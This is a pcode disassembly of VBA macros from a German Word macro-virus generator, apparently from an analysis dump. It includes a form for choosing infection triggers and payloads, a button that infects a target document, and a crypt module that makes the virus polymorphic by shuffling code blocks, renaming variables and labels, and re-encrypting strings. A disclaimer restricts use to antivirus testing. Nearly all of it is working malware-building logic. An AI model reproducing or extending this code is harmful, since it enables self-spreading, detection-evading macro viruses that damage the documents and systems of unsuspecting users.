' 	Ld Label_keine_Auswahl 
' 	MemLd Visible 
' 	Not 
' 	Ld MultiPage 
' 	MemLd Page_Infect 
' 	MemLd Visible 
' 	And 
' 	Paren 
' 	Ld Button_Start 
' 	MemSt Enabled 
' Line #147:
' 	EndSub 
' Line #148:
' 	FuncDefn (Private Sub Check_Lizenz_Change())
' Line #149:
' 	Ld Check_Lizenz 
' 	MemLd Value 
' 	IfBlock 
' Line #150:
' 	LitVarSpecial (False)
' 	Ld Check_Lizenz 
' 	MemSt Visible 
' Line #151:
' 	StartWithExpr 
' 	Ld MultiPage 
' 	With 
' Line #152:
' 	LitVarSpecial (True)
' 	MemLdWith Page_Infect 
' 	MemSt Visible 
' Line #153:
' 	LitVarSpecial (True)
' 	MemLdWith Page_PayLoad 
' 	MemSt Visible 
' Line #154:
' 	EndWith 
' Line #155:
' 	LitVarSpecial (True)
' 	Ld Button_Start 
' 	MemSt Enabled 
' Line #156:
' 	EndIfBlock 
' Line #157:
' 	EndSub 
' Line #158:
' 	FuncDefn (Private Sub Button_Start_Click())
' Line #159:
' 	Ld FormVirus 
' 	ArgsMemCall Show 0x0000 
' Line #160:
' 	Ld ZielDocument 
' 	LitNothing 
' 	Is 
' 	Not 
' 	IfBlock 
' Line #161:
' 	LitStr 0x000B "Dokument: ""
' 	Ld ZielDocument 
' 	MemLd FullName 
' 	Concat 
' 	LitStr 0x0011 "" wird infiziert."
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x001B "Soll ich das wirklich tun ?"
' 	Concat 
' 	Ld vbYesNo 
' 	Ld vbDefaultButton1 
' 	Add 
' 	Ld vbExclamation 
' 	Add 
' 	Ld EsIstIch 
' 	ArgsLd MsgBox 0x0003 
' 	Ld vbNo 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #162:
' 	ArgsCall Generator_Run 0x0000 
' Line #163:
' 	Ld id_FFFF 
' 	ArgsCall Unlock 0x0001 
' Line #164:
' 	EndIfBlock 
' Line #165:
' 	EndSub 
' Line #166:
' 	FuncDefn (Private Sub CommandButton2_Click())
' Line #167:
' 	Ld id_FFFF 
' 	ArgsCall Unlock 0x0001 
' Line #168:
' 	EndSub 
' Line #169:
' 	FuncDefn (Private Sub Button_HyperLink_Click())
' Line #170:
' 	Ld FormHyperLink 
' 	ArgsMemCall Show 0x0000 
' Line #171:
' 	Ld Dat_HyperLink 
' 	MemLd OK 
' 	If 
' 	BoSImplicit 
' 	Ld MainUserForm 
' 	MemLd ImageOK 
' 	MemLd Picture 
' 	Ld Button_HyperLink 
' 	MemSt Picture 
' 	Else 
' 	BoSImplicit 
' 	Ld MainUserForm 
' 	MemLd ImageNO 
' 	MemLd Picture 
' 	Ld Button_HyperLink 
' 	MemSt Picture 
' 	EndIf 
' Line #172:
' 	Ld Dat_HyperLink 
' 	MemLd OK 
' 	Ld Dat_HyperLink 
' 	MemLd Datum 
' 	MemLd OK 
' 	Ld Dat_HyperLink 
' 	MemLd Zufall 
' 	MemLd OK 
' 	Or 
' 	Paren 
' 	And 
' 	Ld Check_HyperLink 
' 	MemSt Enabled 
' Line #173:
' 	Ld Check_HyperLink 
' 	MemLd Enabled 
' 	Ld Check_HyperLink 
' 	MemSt Value 
' Line #174:
' 	EndSub 
' Line #175:
' 	FuncDefn (Private Sub Button_TextBox_Click())
' Line #176:
' 	Ld FormTextBox 
' 	ArgsMemCall Show 0x0000 
' Line #177:
' 	Ld Dat_TextBox 
' 	MemLd OK 
' 	If 
' 	BoSImplicit 
' 	Ld ImageOK 
' 	MemLd Picture 
' 	Ld Button_TextBox 
' 	MemSt Picture 
' 	Else 
' 	BoSImplicit 
' 	Ld ImageNO 
' 	MemLd Picture 
' 	Ld Button_TextBox 
' 	MemSt Picture 
' 	EndIf 
' Line #178:
' 	Ld Dat_TextBox 
' 	MemLd OK 
' 	Ld Dat_TextBox 
' 	MemLd Datum 
' 	MemLd OK 
' 	Ld Dat_TextBox 
' 	MemLd Zufall 
' 	MemLd OK 
' 	Or 
' 	Paren 
' 	And 
' 	Ld Check_TextBox 
' 	MemSt Enabled 
' Line #179:
' 	Ld Check_TextBox 
' 	MemLd Enabled 
' 	Ld Check_TextBox 
' 	MemSt Value 
' Line #180:
' 	EndSub 
' Line #181:
' 	FuncDefn (Private Sub Button_TextTauschen_Click())
' Line #182:
' 	Ld FormReplace 
' 	ArgsMemCall Show 0x0000 
' Line #183:
' 	Ld Dat_Replace 
' 	MemLd OK 
' 	If 
' 	BoSImplicit 
' 	Ld ImageOK 
' 	MemLd Picture 
' 	Ld Button_TextTauschen 
' 	MemSt Picture 
' 	Else 
' 	BoSImplicit 
' 	Ld ImageNO 
' 	MemLd Picture 
' 	Ld Button_TextTauschen 
' 	MemSt Picture 
' 	EndIf 
' Line #184:
' 	Ld Dat_Replace 
' 	MemLd OK 
' 	Ld Dat_Replace 
' 	MemLd Datum 
' 	MemLd OK 
' 	Ld Dat_Replace 
' 	MemLd Zufall 
' 	MemLd OK 
' 	Or 
' 	Paren 
' 	And 
' 	Ld Check_TextTauschen 
' 	MemSt Enabled 
' Line #185:
' 	Ld Check_TextTauschen 
' 	MemLd Enabled 
' 	Ld Check_TextTauschen 
' 	MemSt Value 
' Line #186:
' 	EndSub 
' Line #187:
' 	FuncDefn (Private Sub Check_AkivDocDel_Change())
' Line #188:
' 	Ld Check_AkivDocDel 
' 	MemLd Value 
' 	Ld Dat_AkivDocDel 
' 	MemSt OK 
' Line #189:
' 	EndSub 
' Line #190:
' Line #191:
' 	FuncDefn (Private Sub Label_Info_Click())
' Line #192:
' Line #193:
' 	EndSub 
' Line #194:
' Line #195:
' 	FuncDefn (Private Sub UserForm_Initialize())
' Line #196:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt Visible 
' Line #197:
' 	LitVarSpecial (False)
' 	Ld Button_Start 
' 	MemSt Enabled 
' Line #198:
' Line #199:
' 	StartWithExpr 
' 	Ld Check_Lizenz 
' 	With 
' Line #200:
' 	LitVarSpecial (True)
' 	MemStWith Visible 
' Line #201:
' 	LitVarSpecial (False)
' 	MemStWith Value 
' Line #202:
' 	EndWith 
' Line #203:
' Line #204:
' 	StartWithExpr 
' 	Ld MultiPage 
' 	With 
' Line #205:
' 	LitVarSpecial (False)
' 	MemLdWith Page_Infect 
' 	MemSt Visible 
' Line #206:
' 	LitVarSpecial (False)
' 	MemLdWith Page_PayLoad 
' 	MemSt Visible 
' Line #207:
' 	EndWith 
' Line #208:
' Line #209:
' 	LitVarSpecial (True)
' 	Ld Check_DocumentOpen 
' 	MemSt Value 
' Line #210:
' 	LitVarSpecial (True)
' 	Ld Check_DocumentClose 
' 	MemSt Value 
' Line #211:
' 	LineCont 0x0010 0E 00 2A 00 12 00 2A 00 16 00 2A 00 1A 00 2A 00
' 	Ld vbCr 
' 	Ld vbCr 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0040 "    Der Virus-Generator darf nur zum Test von Antiviren-Software"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x004F "    eingesetzt werden. Erstellte Viren dürfen nicht in Umlauf gebracht oder auf"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0047 "    irgendeine andere Art verbreitet werden. Für Schäden, die durch den"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x004B "    Generator oder durch von ihm erstellte Viren entstehen, lehne ich jede "
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0015 "    Verantwortung ab."
' 	Concat 
' 	Ld InfoLabel 
' 	MemSt Caption 
' Line #212:
' Line #213:
' 	StartWithExpr 
' 	Ld Dat_Datum 
' 	With 
' Line #214:
' 	LitDI2 0x0001 
' 	MemStWith Tag 
' Line #215:
' 	LitDI2 0x0001 
' 	MemStWith Monat 
' Line #216:
' 	LitVarSpecial (False)
' 	MemStWith JedenTag 
' Line #217:
' 	LitVarSpecial (False)
' 	MemStWith JedenMonat 
' Line #218:
' 	LitVarSpecial (False)
' 	MemStWith OK 
' Line #219:
' 	LitVarSpecial (False)
' 	MemStWith Auswahl 
' Line #220:
' 	EndWith 
' Line #221:
' Line #222:
' 	StartWithExpr 
' 	Ld Dat_Zufall 
' 	With 
' Line #223:
' 	LitDI2 0x0000 
' 	MemStWith Randomize 
' Line #224:
' 	LitVarSpecial (False)
' 	MemStWith OK 
' Line #225:
' 	LitVarSpecial (False)
' 	MemStWith Auswahl 
' Line #226:
' 	EndWith 
' Line #227:
' Line #228:
' 	StartWithExpr 
' 	Ld Dat_TextBox 
' 	With 
' Line #229:
' 	LitStr 0x0000 ""
' 	MemStWith Title 
' Line #230:
' 	LitStr 0x0000 ""
' 	MemStWith Prompt 
' Line #231:
' 	Ld vbCritical 
' 	MemStWith Symbol 
' Line #232:
' 	LitVarSpecial (True)
' 	MemStWith SymbolAktiv 
' Line #233:
' 	LitVarSpecial (False)
' 	MemStWith OK 
' Line #234:
' 	Ld Dat_Datum 
' 	MemStWith Datum 
' Line #235:
' 	LitVarSpecial (False)
' 	MemStWith DatumWahl 
' Line #236:
' 	Ld Dat_Zufall 
' 	MemStWith Zufall 
' Line #237:
' 	LitVarSpecial (False)
' 	MemStWith ZufallWahl 
' Line #238:
' 	EndWith 
' Line #239:
' Line #240:
' 	StartWithExpr 
' 	Ld Dat_HyperLink 
' 	With 
' Line #241:
' 	LitStr 0x0000 ""
' 	MemStWith Link 
' Line #242:
' 	LitVarSpecial (False)
' 	MemStWith OK 
' Line #243:
' 	Ld Dat_Datum 
' 	MemStWith Datum 
' Line #244:
' 	LitVarSpecial (False)
' 	MemStWith DatumWahl 
' Line #245:
' 	Ld Dat_Zufall 
' 	MemStWith Zufall 
' Line #246:
' 	LitVarSpecial (False)
' 	MemStWith ZufallWahl 
' Line #247:
' 	EndWith 
' Line #248:
' Line #249:
' 	StartWithExpr 
' 	Ld Dat_Replace 
' 	With 
' Line #250:
' 	LitStr 0x0000 ""
' 	MemStWith Orginal 
' Line #251:
' 	LitStr 0x0000 ""
' 	MemStWith Replace 
' Line #252:
' 	LitVarSpecial (False)
' 	MemStWith GanzesWort 
' Line #253:
' 	LitVarSpecial (False)
' 	MemStWith OK 
' Line #254:
' 	Ld Dat_Datum 
' 	MemStWith Datum 
' Line #255:
' 	LitVarSpecial (False)
' 	MemStWith DatumWahl 
' Line #256:
' 	Ld Dat_Zufall 
' 	MemStWith Zufall 
' Line #257:
' 	LitVarSpecial (False)
' 	MemStWith ZufallWahl 
' Line #258:
' 	EndWith 
' Line #259:
' Line #260:
' 	StartWithExpr 
' 	Ld Dat_AkivDocDel 
' 	With 
' Line #261:
' 	LitVarSpecial (False)
' 	MemStWith OK 
' Line #262:
' 	Ld Dat_Datum 
' 	MemStWith Datum 
' Line #263:
' 	LitVarSpecial (False)
' 	MemStWith DatumWahl 
' Line #264:
' 	Ld Dat_Zufall 
' 	MemStWith Zufall 
' Line #265:
' 	LitVarSpecial (False)
' 	MemStWith ZufallWahl 
' Line #266:
' 	EndWith 
' Line #267:
' Line #268:
' 	StartWithExpr 
' 	Ld StartProcedure 
' 	With 
' Line #269:
' 	Ld Check_AutoNew 
' 	MemLd Value 
' 	MemStWith AutoNew 
' Line #270:
' 	Ld Check_AutoNew 
' 	MemLd Value 
' 	MemStWith AutoOpen 
' Line #271:
' 	Ld Check_AutoNew 
' 	MemLd Value 
' 	MemStWith AutoClose 
' Line #272:
' 	Ld Check_DocumentNew 
' 	MemLd Value 
' 	MemStWith DocNew 
' Line #273:
' 	Ld Check_DocumentOpen 
' 	MemLd Value 
' 	MemStWith DocOpen 
' Line #274:
' 	Ld Check_DocumentClose 
' 	MemLd Value 
' 	MemStWith DocClose 
' Line #275:
' 	EndWith 
' Line #276:
' Line #277:
' Line #278:
' 	LineCont 0x0004 08 00 03 00
' 	LitStr 0x0015 "Das ist unlogisch !!!"
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x001D "Wie soll ich den da starten ?"
' 	Concat 
' 	Ld Label_keine_Auswahl 
' 	MemSt Caption 
' Line #279:
' 	LineCont 0x0014 0C 00 2F 00 10 00 2F 00 14 00 2F 00 1A 00 2F 00 1E 00 2F 00
' 	Ld vbCr 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x001F "    Das Starten von Auto-Makros"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0025 "    kann durch Drücken der STRG-Taste"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0027 "    oder den Befehl "DisableAutoMacros""
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0017 "    unterdrückt werden."
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0026 "    Ich habe dann keine Möglichkeit um"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0029 "    zu starten und mich zu schützen !!!!!"
' 	Concat 
' 	Ld Label_Main_InfectInfo 
' 	MemSt Caption 
' Line #280:
' Line #281:
' 	LineCont 0x001C 0C 00 24 00 10 00 24 00 14 00 24 00 18 00 24 00 1C 00 24 00 20 00 24 00 24 00 24 00
' 	Ld vbCr 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x001E "    Verschlüsslungsstrategien:"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0032 "       - Umbenennung aller Variablen im Virus-Code"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0035 "       - Umbenennung aller Sprungmarken im Virus-Code"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x002D "       - Neuverschlüsslung aller Texteinträge"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x004A "       - Neuanordnung der 22 Codemodule innerhalb der einen Haupt-Procedur"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x004C "       - Einfügen einer zufälligen Menge von Leerzeichen vor jeder Codezeile"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0030 "       - zufälliges Einfügen von Zeilenumbrüchen"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0045 "       - zufälliges Einfügen von Kommentarzeilen mit variablen Inhalt"
' 	Concat 
' 	Ld Label_Info 
' 	MemSt Caption 
' Line #282:
' Line #283:
' Line #284:
' 	EndSub 
' Line #285:
' 	FuncDefn (Private Sub UserForm_QueryClose(Cancel As Integer, CloseMode As Integer))
' Line #286:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt Visible 
' Line #287:
' 	EndSub 
' Macros/VBA/CryptModul - 8806 bytes
' Line #0:
' 	Option  (Explicit)
' Line #1:
' Line #2:
' 	FuncDefn (Public Function Get_Neuen_SchlüsselCode(ByVal OldSchlüssel As String) As String)
' Line #3:
' 	Dim 
' 	VarDefn Buf (As String)
' 	VarDefn TmpStr (As String)
' 	VarDefn x (As Long)
' 	VarDefn y (As Long)
' Line #4:
' 	Ld OldSchlüssel 
' 	St Buf 
' Line #5:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Buf 
' 	FnLen 
' 	For 
' Line #6:
' 	Ld Rnd 
' 	Ld Buf 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St y 
' Line #7:
' 	Ld Buf 
' 	Ld y 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St TmpStr 
' Line #8:
' 	Ld Buf 
' 	Ld x 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Ld Buf 
' 	Ld y 
' 	LitDI2 0x0001 
' 	Mid 
' Line #9:
' 	Ld TmpStr 
' 	Ld Buf 
' 	Ld x 
' 	LitDI2 0x0001 
' 	Mid 
' Line #10:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #11:
' 	Ld Buf 
' 	St Get_Neuen_SchlüsselCode 
' Line #12:
' 	EndFunc 
' Line #13:
' Line #14:
' 	FuncDefn (Public Sub BlöckeTauschen(ByRef Code As String))
' Line #15:
' 	Dim 
' 	VarDefn BlockNamen (As Variant)
' 	VarDefn EndMarke (As String)
' 	VarDefn x (As Long)
' 	VarDefn y (As Long)
' 	VarDefn VStart (As Long)
' 	VarDefn VEnde (As Long)
' 	VarDefn TmpStr (As String)
' 	OptionBase 
' 	LitDI2 0x0016 
' 	VarDefn VirusModule (As String)
' Line #16:
' 	OnError fehler 
' Line #17:
' 	LitStr 0x0007 "Yny7e7C"
' 	LitStr 0x0008 "S02217RK"
' 	LitStr 0x0006 "J54Jq0"
' 	LitStr 0x0006 "E7swNF"
' 	LitStr 0x0007 "L8n9WKR"
' 	LitStr 0x0006 "OC9esi"
' 	LitStr 0x0005 "XDP63"
' 	LitStr 0x0008 "TxGb0ns9"
' 	LitStr 0x0008 "RIud9DoA"
' 	LitStr 0x0006 "O0hy73"
' 	LitStr 0x0008 "E7KiNw0R"
' 	LitStr 0x0006 "M6K4f0"
' 	LitStr 0x0008 "VK8fm7H2"
' 	LitStr 0x0005 "G8b3E"
' 	LitStr 0x0007 "S7M988u"
' 	LitStr 0x0005 "O192b"
' 	LitStr 0x0006 "E1QdMs"
' 	LitStr 0x0007 "Xg645Ye"
' 	LitStr 0x0008 "VXdgkhe6"
' 	LitStr 0x0008 "NwR7Xamt"
' 	LitStr 0x0005 "R0Lsd"
' 	LitStr 0x0008 "Iml96v3i"
' 	LitStr 0x0008 "VvhD15Ok"
' 	LitStr 0x0007 "MStoLEX"
' 	ArgsArray Array 0x0018 
' 	St BlockNamen 
' Line #18:
' 	LitStr 0x0005 "GoTo "
' 	LitOI2 0x0017 
' 	ArgsLd BlockNamen 0x0001 
' 	Concat 
' 	St EndMarke 
' Line #19:
' Line #20:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitOI2 0x0000 
' 	LitOI2 0x0016 
' 	For 
' Line #21:
' 	LitDI2 0x0001 
' 	Ld Code 
' 	Ld x 
' 	ArgsLd BlockNamen 0x0001 
' 	LitOI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	FnInStr3 
' 	St VStart 
' Line #22:
' 	Ld VStart 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld VStart 
' 	Ld Code 
' 	Ld EndMarke 
' 	FnInStr3 
' 	Ld EndMarke 
' 	FnLen 
' 	Add 
' 	Ld VStart 
' 	Sub 
' 	St VEnde 
' 	EndIf 
' Line #23:
' 	Ld VEnde 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld Code 
' 	Ld VStart 
' 	Ld VEnde 
' 	ArgsLd Mid$ 0x0003 
' 	Ld vbCr 
' 	Concat 
' 	Ld x 
' 	ArgsSt VirusModule 0x0001 
' 	EndIf 
' Line #24:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #25:
' Line #26:
' 	Ld Code 
' 	Ld Code 
' 	LitOI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	FnInStr 
' 	ArgsLd LBound 0x0002 
' 	Ld vbCr 
' 	Concat 
' 	LitOI2 0x0000 
' 	ArgsLd VirusModule 0x0001 
' 	Concat 
' 	St Code 
' Line #27:
' 	LitOI2 0x0001 
' 	ArgsLd VirusModule 0x0001 
' 	St TmpStr 
' Line #28:
' 	LitOI2 0x0002 
' 	ArgsLd VirusModule 0x0001 
' 	LitOI2 0x0001 
' 	ArgsSt VirusModule 0x0001 
' Line #29:
' 	Ld TmpStr 
' 	LitOI2 0x0002 
' 	ArgsSt VirusModule 0x0001 
' Line #30:
' Line #31:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitOI2 0x0003 
' 	LitOI2 0x0016 
' 	For 
' Line #32:
' 	Ld Rnd 
' 	LitOI2 0x0013 
' 	Mul 
' 	FnInt 
' 	LitOI2 0x0003 
' 	Add 
' 	St y 
' Line #33:
' 	Ld x 
' 	ArgsLd VirusModule 0x0001 
' 	St TmpStr 
' Line #34:
' 	Ld y 
' 	ArgsLd VirusModule 0x0001 
' 	Ld x 
' 	ArgsSt VirusModule 0x0001 
' Line #35:
' 	Ld TmpStr 
' 	Ld y 
' 	ArgsSt VirusModule 0x0001 
' Line #36:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #37:
' Line #38:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitOI2 0x0001 
' 	LitOI2 0x0016 
' 	For 
' Line #39:
' 	Ld Code 
' 	Ld x 
' 	ArgsLd VirusModule 0x0001 
' 	Concat 
' 	St Code 
' Line #40:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #41:
' Line #42:
' 	Ld Code 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0007 "DcJ7WD5"
' 	Concat 
' 	LitOI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitOI2 0x0017 
' 	ArgsLd BlockNamen 0x0001 
' 	Concat 
' 	LitOI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St Code 
' Line #43:
' 	ExitSub 
' Line #44:
' Line #45:
' 	Label fehler 
' Line #46:
' 	LitStr 0x001D "Fehler bei der Erstellung !!!"
' 	Ld vbCritical 
' 	LitStr 0x0006 "Fehler"
' 	ArgsCall MsgBox 0x0003 
' Line #47:
' 	End 
' Line #48:
' 	EndSub 
' Line #49:
' Line #50:
' 	FuncDefn (Public Sub Schlüssel_ändern(ByRef Code As String, OldSchlüssel As String, NewSchlüssel As String))
' Line #51:
' 	Dim 
' 	VarDefn TmpStr (As String)
' 	VarDefn VStart (As Long)
' 	VarDefn VEnde (As Long)
' Line #52:
' Line #53:
' 	LitStr 0x0005 "Const"
' 	St TmpStr 
' Line #54:
' 	LitDI2 0x0001 
' 	Ld Code 
' 	Ld TmpStr 
' 	FnInStr3 
' 	LitDI2 0x0005 
' 	Add 
' 	St VStart 
' Line #55:
' 	Ld VStart 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld VStart 
' 	Ld Code 
' 	LitOI2 0x003D 
' 	ArgsLd Chr 0x0001 
' 	FnInStr3 
' 	St VEnde 
' 	EndIf 
' Line #56:
' 	Ld Code 
' 	Ld Code 
' 	Ld VStart 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld VEnde 
' 	Ld VStart 
' 	Sub 
' 	Paren 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Trim 0x0001 
' 	ArgsLd VarVerschlüsseln 0x0002 
' 	St Code 
' Line #57:
' 	Ld VStart 
' 	Ld Code 
' 	LitOI2 0x003D 
' 	ArgsLd Chr 0x0001 
' 	FnInStr3 
' 	LitDI2 0x0003 
' 	Add 
' 	St VStart 
' Line #58:
' 	Ld VStart 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld Code 
' 	FnLen 
' 	Ld VStart 
' 	Ld NewSchlüssel 
' 	FnLen 
' 	Add 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Sub 
' 	St VEnde 
' 	EndIf 
' Line #59:
' 	Ld VStart 
' 	LitDI2 0x0000 
' 	Gt 
' 	Ld Code 
' 	Ld VStart 
' 	Ld OldSchlüssel 
' 	FnLen 
' 	ArgsLd Mid$ 0x0003 
' 	Ld OldSchlüssel 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld NewSchlüssel 
' 	Ld Code 
' 	Ld VStart 
' 	Ld OldSchlüssel 
' 	FnLen 
' 	Mid 
' 	EndIf 
' Line #60:
' 	EndSub 
' Line #61:
' Line #62:
' 	FuncDefn (Public Sub Texteinträge_ändern(ByRef Code As String, OldSchlüssel As String, NewSchlüssel As String))
' Line #63:
' 	Dim 
' 	VarDefn TmpStr (As String)
' 	VarDefn VStart (As Long)
' 	VarDefn VEnde (As Long)
' Line #64:
' 	LitDI2 0x0001 
' 	Ld Code 
' 	Ld NewSchlüssel 
' 	FnInStr3 
' 	Ld NewSchlüssel 
' 	FnLen 
' 	Add 
' 	St VStart 
' Line #65:
' 	Ld VStart 
' 	Ld Code 
' 	Ld vbCr 
' 	FnInStr3 
' 	LitDI2 0x0001 
' 	Add 
' 	St VEnde 
' Line #66:
' 	Ld VEnde 
' 	LitDI2 0x0000 
' 	Gt 
' 	DoWhile 
' Line #67:
' 	Ld VEnde 
' 	LitDI2 0x0003 
' 	Add 
' 	Ld Code 
' 	LitStr 0x0002 "= "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	FnInStr3 
' 	LitDI2 0x0003 
' 	Add 
' 	St VStart 
' Line #68:
' 	Ld VStart 
' 	LitDI2 0x0003 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld VStart 
' 	Ld Code 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	FnInStr3 
' 	St VEnde 
' 	Else 
' 	BoSImplicit 
' 	LitOI2 0x0000 
' 	St VEnde 
' 	EndIf 
' Line #69:
' 	Ld VEnde 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #70:
' 	Ld Code 
' 	Ld VStart 
' 	Ld VEnde 
' 	Ld VStart 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Trim 0x0001 
' 	St TmpStr 
' Line #71:
' 	Ld TmpStr 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld TmpStr 
' 	Ld OldSchlüssel 
' 	ArgsLd DeCrypt 0x0002 
' 	Ld NewSchlüssel 
' 	ArgsLd DeCrypt 0x0002 
' 	St TmpStr 
' 	EndIf 
' Line #72:
' 	Ld Code 
' 	Ld VStart 
' 	LitOI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	Ld TmpStr 
' 	Concat 
' 	Ld Code 
' 	Ld VEnde 
' 	ArgsLd Mid$ 0x0002 
' 	Concat 
' 	St Code 
' Line #73:
' 	EndIfBlock 
' Line #74:
' 	Loop 
' Line #75:
' 	EndSub 
' Line #76:
' Line #77:
' 	FuncDefn (Public Sub Var_ändern(ByRef Code As String))
' Line #78:
' 	Dim 
' 	VarDefn TmpStr (As String)
' 	VarDefn VStart (As Long)
' 	VarDefn VEnde (As Long)
' Line #79:
' 	LitDI2 0x0001 
' 	St VEnde 
' Line #80:
' 	Ld VEnde 
' 	LitOI2 0x0000 
' 	Gt 
' 	DoWhile 
' Line #81:
' 	Ld VEnde 
' 	LitOI2 0x0003 
' 	Add 
' 	Ld Code 
' 	LitOI2 0x0044 
' 	ArgsLd Chr 0x0001 
' 	LitOI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitOI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	FnInStr3 
' 	St VStart 
' Line #82:
' 	Ld VStart 
' 	LitOI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld VStart 
' 	LitOI2 0x0003 
' 	Add 
' 	Ld Code 
' 	LitOI2 0x0041 
' 	ArgsLd Chr 0x0001 
' 	LitOI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	FnInStr3 
' 	St VEnde 
' 	Else 
' 	BoSImplicit 
' 	LitDI2 0x0000 
' 	St VEnde 
' 	EndIf 
' Line #83:
' 	Ld VEnde 
' 	LitOI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #84:
' 	Ld VirusCodeBuffer 
' 	Ld VStart 
' 	LitOI2 0x0003 
' 	Add 
' 	Ld VEnde 
' 	Ld VStart 
' 	Sub 
' 	Paren 
' 	LitOI2 0x0003 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Trim 0x0001 
' 	St TmpStr 
' Line #85:
' 	Ld TmpStr 
' 	LitOI2 0x0028 
' 	ArgsLd Chr 0x0001 
' 	FnInStr 
' 	LitOI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Code 
' 	Ld TmpStr 
' 	ArgsLd VarVerschlüsseln 0x0002 
' 	St Code 
' 	EndIf 
' Line #86:
' 	EndIfBlock 
' Line #87:
' 	Loop 
' Line #88:
' 	EndSub 
' Line #89:
' Line #90:
' 	FuncDefn (Public Sub Sprungmarken_ändern(ByRef Code As String))
' Line #91:
' 	Dim 
' 	VarDefn TmpStr (As String)
' 	VarDefn VStart (As Long)
' 	VarDefn VEnde (As Long)
' 	VarDefn x (As Long)
' Line #92:
' 	LitDI2 0x0001 
' 	St VEnde 
' Line #93:
' 	LitDI2 0x0001 
' 	St VStart 
' Line #94:
' 	Ld VEnde 
' 	LitDI2 0x0000 
' 	Gt 
' 	DoWhile 
' Line #95:
' 	Ld VStart 
' 	Ld Code 
' 	LitOI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Ld vbCr 
' 	Concat 
' 	FnInStr3 
' 	St VEnde 
' Line #96:
' 	Ld VEnde 
' 	LitDI2 0x0014 
' 	Sub 
' 	LitOI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #97:
' 	Ld VEnde 
' 	LitDI2 0x0014 
' 	Sub 
' 	St VStart 
' 	BoS 0x0000 
